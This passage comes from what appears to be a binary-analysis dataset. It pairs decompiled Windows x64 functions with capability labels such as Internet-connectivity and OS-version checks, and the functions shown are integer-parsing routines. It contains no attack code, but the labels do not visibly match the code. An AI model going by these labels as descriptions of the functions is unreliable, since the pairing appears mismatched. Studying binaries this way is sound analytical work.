(uVar7 == 0) goto code_r0x000140057db7;\n        uStack140 = 0;\n        uVar11 = 0;\n        iVar21 = 0;\n        bVar3 = false;\ncode_r0x000140058149:\n        uStack148 = 0x10;\n        uVar20 = 0x16;\n        iStack160 = 0x16;\n    }\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar13 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar23 = uStack140 + 0x7fffffff;\n    uVar2 = *(iVar13 + 200);\n    uVar5 = uVar7;\n    if (uVar2 == 0) {\n        uVar22 = 0;\n        if (uVar7 == 0) {\n            uVar19 = 0;\ncode_r0x000140057f55:\n            uVar18 = uVar11;\n            if (uVar20 < 0xb) {\n                if ((uVar11 < 0x30) || (iStack160 + 0x30U <= uVar11)) goto code_r0x000140058228;\n            }\n            else if (9 < uVar11 - 0x30) {\n                if (5 < uVar11 - 0x61) goto code_r0x0001400583d4;\n                iVar12 = uVar18 - 0x57;\n                goto code_r0x000140057f7a;\n            }\n            iVar12 = uVar18 - 0x30;\ncode_r0x000140057f7a:\n            do {\n                piVar4 = piStack104;\n                if (uVar23 / uStack148 < uVar19) {\n                    uVar22 = 1;\n                }\n                else {\n                    uVar18 = uVar19 * uStack148;\n                    uVar19 = uVar18 + iVar12;\n                    iVar21 = iVar21 + 1;\n                    uVar22 = uVar22 | uVar23 - iVar12 < uVar18;\n                }\n                piVar14 = piStack104[3];\n                if (piStack104[2] < piVar14) {\n                    piVar15 = piStack104[2] + 1;\n                    piStack104[2] = piVar15;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar15 = piVar4[2];\n                    piVar14 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar15 < piVar14) {\n                    iVar10 = *piVar15;\n                }\n                else {\n                    iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar10 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar24 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar24)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar24 = iVar9 == -1;\n                }\n                if (bVar24 == (iVar10 == -1)) {\n                    uVar2 = 1;\n                    goto code_r0x000140058014;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar11 = *piStack104[2];\n                    }\n                    else {\n                        uVar11 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar11 != 0xffff) goto code_r0x000140057f55;\n                    piStack104 = NULL;\n                }\n                if (uVar20 < 0xb) goto code_r0x000140058228;\n                uVar18 = 0xffff;\n                uVar11 = 0xffff;\ncode_r0x0001400583d4:\n                if (5 < uVar11 - 0x41) goto code_r0x000140058228;\n                iVar12 = uVar18 - 0x37;\n            } while( true );\n        }\n        uVar19 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\n    else {\n        if (uVar7 == 0) {\n            uVar22 = 0;\n            uVar19 = 0;\ncode_r0x000140058410:\n            if ((*(iVar13 + 0x20) == 0) || (*(iVar13 + 0x4a) != uVar11)) {\n                puVar16 = iVar13 + 0x9c;\n                iVar17 = iStack160;\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x000140058228;\n                while (*puVar16 != uVar11) {\n                    iVar17 = iVar17 + -1;\n                    puVar16 = puVar16 + 1;\n                    if (iVar17 == 0) goto code_r0x000140058228;\n                }\n                iVar12 = puVar16 - (iVar13 + 0x9c) >> 1;\n                if (0xf < iVar12) {\n                    iVar12 = iVar12 + -6;\n                }\n                uVar6 = uVar2;\n                if (uVar19 <= uVar23 / uStack148) {\n                    uVar20 = uVar19 * uStack148;\n                    uVar19 = uVar20 + iVar12;\n                    iVar21 = iVar21 + 1;\n                    uVar6 = uVar22 | uVar23 - iVar12 < uVar20;\n                }\n            }\n            else {\n                if (iVar21 == 0) {\n                    uVar5 = *(iVar13 + 0x20);\n                    uVar2 = 0;\n                    goto code_r0x000140058014;\n                }\n                fcn.14007da40(aiStack80, iVar21);\n                iVar21 = 0;\n                uVar6 = uVar22;\n            }\n            uVar22 = uVar6;\n            piVar4 = piStack104;\n            piVar14 = piStack104[3];\n            if (piStack104[2] < piVar14) {\n                piVar15 = piStack104[2] + 1;\n                piStack104[2] = piVar15;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar15 = piVar4[2];\n                piVar14 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar15 < piVar14) {\n                iVar10 = *piVar15;\n            }\n            else {\n                iVar10 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar10 == -1) {\n                piStack104 = NULL;\n            }\n            bVar24 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar24)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar24 = iVar9 == -1;\n            }\n            if (bVar24 == (iVar10 == -1)) goto code_r0x000140058014;\n            if (piStack104 == NULL) {\n                uVar11 = 0xffff;\n            }\n            else {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            goto code_r0x000140058410;\n        }\n        uVar19 = 0;\n        uVar22 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\ncode_r0x000140058014:\n    uVar7 = uVar5;\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014005823d;\ncode_r0x000140058028:\n    if ((iVar21 != 0) || (bVar3)) {\ncode_r0x000140058281:\n        if (uVar7 == 0) {\n            if (uVar22 == 0) {\n                uVar23 = -uVar19;\n                if (uStack140 == '\\0') {\n                    uVar23 = uVar19;\n                }\n                *in_stack_00000038 = uVar23;\n            }\n            else {\n                *in_stack_00000038 = uStack140 + 0x7fffffff;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x000140058057;\n        }\n    }\n    goto code_r0x00014005803b;\ncode_r0x000140058228:\n    uVar2 = 0;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140058028;\ncode_r0x00014005823d:\n    fcn.14007da40(aiStack80, iVar21);\n    cVar8 = fcn.1400b76a0(*(iVar13 + 0x10), *(iVar13 + 0x18), aiStack80);\n    if (cVar8 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar21 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x000140058281;\ncode_r0x00014005803b:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140058057:\n    if (uVar2 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar21 = **0x14010fc90;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar21 == 0) {\n        iVar21 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar21 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar21 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar21 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4536
    },
    "1400587e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.1400587e0(int64_t **arg1)\n\n{\n    uint64_t arg2;\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    char cVar7;\n    int16_t iVar8;\n    int16_t iVar9;\n    uint16_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int64_t iVar13;\n    int16_t *piVar14;\n    int16_t *piVar15;\n    uint16_t *puVar16;\n    int64_t iVar17;\n    int32_t iVar18;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    bool bVar22;\n    bool bVar23;\n    ulong var_10h;\n    ulong var_18h;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    int64_t iStack144;\n    uint32_t uStack136;\n    uint8_t uStack131;\n    uint8_t uStack130;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar13 = fcn.140026f80(in_stack_00000028 + 0xd0);\n    uVar20 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar20 == 0x40) {\n        uVar19 = 8;\ncode_r0x000140058848:\n        uVar6 = fcn.140029ee0(&piStack104, &piStack120);\n        if (uVar6 == 0) {\ncode_r0x000140058867:\n            uVar10 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar10 = *piStack104[2];\n                }\n                else {\n                    uVar10 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar10 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar7 = *(iVar13 + 0x20);\n            if ((*(iVar13 + 0x94) == uVar10) || (bVar23 = false,  *(iVar13 + 0x96) == uVar10)) {\n                bVar23 = *(iVar13 + 0x94) == uVar10;\n                if (cVar7 != '\\0') {\n                    if ((*(iVar13 + 0x4a) != uVar10) && (*(iVar13 + 0x48) != uVar10)) goto code_r0x000140058b7a;\n                    goto code_r0x0001400588a6;\n                }\n                if (*(iVar13 + 0x48) == uVar10) goto code_r0x0001400588a6;\ncode_r0x000140058b7a:\n                fcn.14009c0a0(piStack104);\n                uStack96 = 0xffff;\n                uVar6 = fcn.140029ee0(&piStack104, &piStack120);\n                if (uVar6 == 0) {\n                    uVar10 = fcn.140029f90(&piStack104);\n                    cVar7 = *(iVar13 + 0x20);\n                    goto code_r0x0001400588a6;\n                }\n                iVar18 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x0001400588a6:\n                iVar18 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar7 == '\\0' || (*(iVar13 + 0x4a) != uVar10)) &&\n                       (uVar10 != *(iVar13 + 0x48)))) {\n                    if (uVar10 == *(iVar13 + 0x9c)) {\n                        bVar3 = bVar3 ^ 1U | uVar19 == 10;\n                        if (!bVar3) goto code_r0x0001400588d9;\n                        bVar22 = uVar19 == 8;\n                        if (bVar22 || uVar20 == 0) {\n                            iVar18 = 0;\n                            uVar19 = 8;\n                            bVar3 = bVar22 || uVar20 == 0;\n                        }\n                        else {\n                            iVar18 = iVar18 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x0001400588d9:\n                        if ((uVar10 != *(iVar13 + 0x98)) && (uVar10 != *(iVar13 + 0x9a))) {\n                            uVar6 = 0;\n                            bVar3 = true;\n                            goto code_r0x000140058982;\n                        }\n                        uVar6 = uVar19 == 0x10 || uVar20 == 0;\n                        if (uVar19 != 0x10 && uVar20 != 0) {\n                            bVar3 = true;\n                            goto code_r0x00014005898c;\n                        }\n                        iVar18 = 0;\n                        uVar19 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar14 = piStack104[2] + 1;\n                        piStack104[2] = piVar14;\n                        if (piVar14 < piStack104[3]) goto code_r0x000140058942;\ncode_r0x000140058df0:\n                        uStack96 = 0xffff;\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar14 = piVar4[2];\n                        if (piVar4[3] <= piVar14) goto code_r0x000140058df0;\ncode_r0x000140058942:\n                        uStack96 = 0xffff;\n                        iVar8 = *piVar14;\n                    }\n                    if (iVar8 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar22 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar22)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar22 = iVar9 == -1;\n                    }\n                    if (bVar22 == (iVar8 == -1)) {\n                        uVar6 = 1;\n                        goto code_r0x000140058982;\n                    }\n                    uVar10 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar10 = *piStack104[2];\n                        }\n                        else {\n                            uVar10 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar10 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar7 = *(iVar13 + 0x20);\n                }\n                uVar6 = 0;\n            }\ncode_r0x000140058982:\n            if (uVar19 == 0x10) goto code_r0x000140058be9;\n        }\n        else {\n            bVar23 = false;\n            uVar10 = 0;\n            iVar18 = 0;\n            bVar3 = false;\n        }\ncode_r0x00014005898c:\n        iStack144 = uVar19;\n        uStack136 = uVar19;\n    }\n    else {\n        uVar19 = 10;\n        if (uVar20 != 8) goto code_r0x000140058848;\n        uVar19 = 0x10;\n        uVar6 = fcn.140029ee0(&piStack104, &piStack120);\n        if (uVar6 == 0) goto code_r0x000140058867;\n        bVar23 = false;\n        uVar10 = 0;\n        iVar18 = 0;\n        bVar3 = false;\ncode_r0x000140058be9:\n        uStack136 = 0x10;\n        uVar19 = 0x16;\n        iStack144 = 0x16;\n    }\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar13 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar20 = 0xffffffff / uStack136;\n    uStack130 = *(iVar13 + 200);\n    if (uStack130 == 0) {\n        uStack131 = 0;\n        if (uVar6 == 0) {\n            uVar12 = 0;\ncode_r0x0001400589fb:\n            uVar11 = uVar10;\n            if (uVar19 < 0xb) {\n                if ((uVar10 < 0x30) || (iStack144 + 0x30U <= uVar10)) goto code_r0x000140058cc8;\n            }\n            else if (9 < uVar10 - 0x30) {\n                if (5 < uVar10 - 0x61) goto code_r0x000140058e74;\n                uVar11 = uVar11 - 0x57;\n                goto code_r0x000140058a1f;\n            }\n            uVar11 = uVar11 - 0x30;\ncode_r0x000140058a1f:\n            do {\n                piVar4 = piStack104;\n                if (uVar20 < uVar12) {\n                    uStack131 = 1;\n                }\n                else {\n                    uVar21 = uVar12 * uStack136;\n                    uVar12 = uVar11 + uVar21;\n                    uStack131 = uStack131 | CARRY4(uVar11, uVar21);\n                    iVar18 = iVar18 + 1;\n                }\n                piVar14 = piStack104[3];\n                if (piStack104[2] < piVar14) {\n                    piVar15 = piStack104[2] + 1;\n                    piStack104[2] = piVar15;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar15 = piVar4[2];\n                    piVar14 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar15 < piVar14) {\n                    iVar8 = *piVar15;\n                }\n                else {\n                    iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar8 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar22 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar22)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar22 = iVar9 == -1;\n                }\n                if (bVar22 == (iVar8 == -1)) {\n                    uStack130 = 1;\n                    uVar5 = uVar6;\n                    goto code_r0x000140058ab8;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = *piStack104[2];\n                    }\n                    else {\n                        uVar10 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar10 != 0xffff) goto code_r0x0001400589fb;\n                    piStack104 = NULL;\n                }\n                if (uVar19 < 0xb) goto code_r0x000140058cc8;\n                uVar11 = 0xffff;\n                uVar10 = 0xffff;\ncode_r0x000140058e74:\n                if (5 < uVar10 - 0x41) goto code_r0x000140058cc8;\n                uVar11 = uVar11 - 0x37;\n            } while( true );\n        }\n        uVar12 = 0;\n        uVar5 = 0;\n        uStack130 = uVar6;\n    }\n    else {\n        if (uVar6 == 0) {\n            uStack131 = 0;\n            uVar12 = 0;\ncode_r0x000140058eb2:\n            if ((*(iVar13 + 0x20) == 0) || (*(iVar13 + 0x4a) != uVar10)) {\n                puVar16 = iVar13 + 0x9c;\n                iVar17 = iStack144;\n                if (*(iVar13 + 0x48) == uVar10) goto code_r0x000140058cc8;\n                while (uVar10 != *puVar16) {\n                    iVar17 = iVar17 + -1;\n                    puVar16 = puVar16 + 1;\n                    if (iVar17 == 0) goto code_r0x000140058cc8;\n                }\n                uVar19 = puVar16 - (iVar13 + 0x9c) >> 1;\n                if (0xf < uVar19) {\n                    uVar19 = uVar19 - 6;\n                }\n                uVar5 = uStack130;\n                if (uVar12 <= uVar20) {\n                    uVar11 = uVar12 * uStack136;\n                    uVar12 = uVar19 + uVar11;\n                    iVar18 = iVar18 + 1;\n                    uVar5 = uStack131 | CARRY4(uVar19, uVar11);\n                }\n            }\n            else {\n                iVar17 = *(aiStack80[0] + -0x18);\n                if (iVar18 == 0) {\n                    uStack130 = 0;\n                    uVar5 = *(iVar13 + 0x20);\n                    goto code_r0x000140058ab8;\n                }\n                arg2 = iVar17 + 1;\n                if (*(aiStack80[0] + -0x10) < arg2) {\ncode_r0x00014005901c:\n                    fcn.14007d790(aiStack80, arg2);\n                }\n                else {\n                    if (**0x14010fc90 == 0) {\n                        iVar2 = *(aiStack80[0] + -8);\n                    }\n                    else {\n                        iVar2 = *(aiStack80[0] + -8);\n                    }\n                    if (0 < iVar2) goto code_r0x00014005901c;\n                }\n                *(aiStack80[0] + *(aiStack80[0] + -0x18)) = iVar18;\n                iVar18 = 0;\n                *(aiStack80[0] + -8) = 0;\n                *(aiStack80[0] + -0x18) = arg2;\n                *(aiStack80[0] + 1 + iVar17) = 0;\n                uVar5 = uStack131;\n            }\n            uStack131 = uVar5;\n            piVar4 = piStack104;\n            piVar14 = piStack104[3];\n            if (piStack104[2] < piVar14) {\n                piVar15 = piStack104[2] + 1;\n                piStack104[2] = piVar15;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar15 = piVar4[2];\n                piVar14 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar15 < piVar14) {\n                iVar8 = *piVar15;\n            }\n            else {\n                iVar8 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar8 == -1) {\n                piStack104 = NULL;\n            }\n            bVar22 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar22)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar22 = iVar9 == -1;\n            }\n            if ((iVar8 == -1) != bVar22) {\n                if (piStack104 == NULL) {\n                    uVar10 = 0xffff;\n                }\n                else {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = *piStack104[2];\n                    }\n                    else {\n                        uVar10 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar10 == 0xffff) {\n                        piStack104 = NULL;\n                    }\n                }\n                goto code_r0x000140058eb2;\n            }\n            goto code_r0x000140058ccd;\n        }\n        uVar12 = 0;\n        uStack131 = 0;\n        uVar5 = 0;\n        uStack130 = uVar6;\n    }\ncode_r0x000140058ab8:\n    uVar6 = uVar5;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140058ac8;\ncode_r0x000140058cdd:\n    fcn.14007da40(aiStack80, iVar18);\n    cVar7 = fcn.1400b76a0(*(iVar13 + 0x10), *(iVar13 + 0x18), aiStack80);\n    if (cVar7 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar18 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x000140058d1f;\n    goto code_r0x000140058ada;\ncode_r0x000140058cc8:\n    uStack130 = 0;\ncode_r0x000140058ccd:\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x000140058cdd;\ncode_r0x000140058ac8:\n    if ((iVar18 != 0) || (bVar3)) {\ncode_r0x000140058d1f:\n        if (uVar6 == 0) {\n            if (uStack131 == 0) {\n                if (bVar23) {\n                    uVar12 = -uVar12;\n                }\n                *in_stack_00000038 = uVar12;\n            }\n            else {\n                *in_stack_00000038 = 0xffffffff;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x000140058af6;\n        }\n    }\ncode_r0x000140058ada:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140058af6:\n    if (uStack130 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar18 = **0x14010fc90;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar18 == 0) {\n        iVar18 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar18 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar18 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar18 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4778
    },
    "1400592f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.1400592f0(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    char cVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    uint16_t uVar11;\n    int32_t iVar12;\n    int64_t iVar13;\n    int16_t *piVar14;\n    int16_t *piVar15;\n    uint16_t *puVar16;\n    int64_t iVar17;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint16_t uVar18;\n    int32_t iVar19;\n    uint32_t uVar20;\n    int32_t iVar21;\n    uint8_t uVar22;\n    uint32_t uVar23;\n    bool bVar24;\n    bool bVar25;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint16_t *in_stack_00000038;\n    uint16_t uStack156;\n    int64_t iStack152;\n    uint32_t uStack136;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar13 = fcn.140026f80(in_stack_00000028 + 0xd0);\n    uVar23 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar23 == 0x40) {\n        uVar20 = 8;\ncode_r0x000140059358:\n        uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n        if (uVar7 == 0) {\ncode_r0x000140059377:\n            uVar11 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar8 = *(iVar13 + 0x20);\n            if ((*(iVar13 + 0x94) == uVar11) || (bVar25 = false,  *(iVar13 + 0x96) == uVar11)) {\n                bVar25 = *(iVar13 + 0x94) == uVar11;\n                if (cVar8 != '\\0') {\n                    if ((*(iVar13 + 0x4a) != uVar11) && (*(iVar13 + 0x48) != uVar11)) goto code_r0x000140059692;\n                    goto code_r0x0001400593b6;\n                }\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x0001400593b6;\ncode_r0x000140059692:\n                fcn.14009c0a0(piStack104);\n                uStack96 = 0xffff;\n                uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n                if (uVar7 == 0) {\n                    uVar11 = fcn.140029f90(&piStack104);\n                    cVar8 = *(iVar13 + 0x20);\n                    goto code_r0x0001400593b6;\n                }\n                iVar21 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x0001400593b6:\n                iVar21 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar8 == '\\0' || (*(iVar13 + 0x4a) != uVar11)) &&\n                       (*(iVar13 + 0x48) != uVar11))) {\n                    if (*(iVar13 + 0x9c) == uVar11) {\n                        bVar3 = bVar3 ^ 1U | uVar20 == 10;\n                        if (!bVar3) goto code_r0x0001400593e9;\n                        bVar24 = uVar20 == 8;\n                        if (bVar24 || uVar23 == 0) {\n                            iVar21 = 0;\n                            uVar20 = 8;\n                            bVar3 = bVar24 || uVar23 == 0;\n                        }\n                        else {\n                            iVar21 = iVar21 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x0001400593e9:\n                        if ((*(iVar13 + 0x98) != uVar11) && (*(iVar13 + 0x9a) != uVar11)) {\n                            uVar7 = 0;\n                            bVar3 = true;\n                            goto code_r0x000140059492;\n                        }\n                        uVar7 = uVar20 == 0x10 || uVar23 == 0;\n                        if (uVar20 != 0x10 && uVar23 != 0) {\n                            bVar3 = true;\n                            goto code_r0x00014005949c;\n                        }\n                        iVar21 = 0;\n                        uVar20 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar14 = piStack104[2] + 1;\n                        piStack104[2] = piVar14;\n                        if (piVar14 < piStack104[3]) goto code_r0x000140059452;\ncode_r0x000140059900:\n                        uStack96 = 0xffff;\n                        iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar14 = piVar4[2];\n                        if (piVar4[3] <= piVar14) goto code_r0x000140059900;\ncode_r0x000140059452:\n                        uStack96 = 0xffff;\n                        iVar10 = *piVar14;\n                    }\n                    if (iVar10 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar24 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar24)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar24 = iVar9 == -1;\n                    }\n                    if ((iVar10 == -1) == bVar24) {\n                        uVar7 = 1;\n                        goto code_r0x000140059492;\n                    }\n                    uVar11 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar11 = *piStack104[2];\n                        }\n                        else {\n                            uVar11 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar11 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar8 = *(iVar13 + 0x20);\n                }\n                uVar7 = 0;\n            }\ncode_r0x000140059492:\n            if (uVar20 == 0x10) goto code_r0x000140059701;\n        }\n        else {\n            bVar25 = false;\n            uVar11 = 0;\n            iVar21 = 0;\n            bVar3 = false;\n        }\ncode_r0x00014005949c:\n        iStack152 = uVar20;\n        uStack136 = uVar20;\n    }\n    else {\n        uVar20 = 10;\n        if (uVar23 != 8) goto code_r0x000140059358;\n        uVar20 = 0x10;\n        uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n        if (uVar7 == 0) goto code_r0x000140059377;\n        bVar25 = false;\n        uVar11 = 0;\n        iVar21 = 0;\n        bVar3 = false;\ncode_r0x000140059701:\n        uStack136 = 0x10;\n        uVar20 = 0x16;\n        iStack152 = 0x16;\n    }\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar13 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar2 = *(iVar13 + 200);\n    uStack156 = 0xffff / uStack136;\n    uVar5 = uVar7;\n    if (uVar2 == 0) {\n        uVar22 = 0;\n        if (uVar7 == 0) {\n            iVar19 = 0;\ncode_r0x00014005950c:\n            uVar18 = iVar19;\n            uVar23 = uVar11;\n            if (uVar20 < 0xb) {\n                if ((uVar11 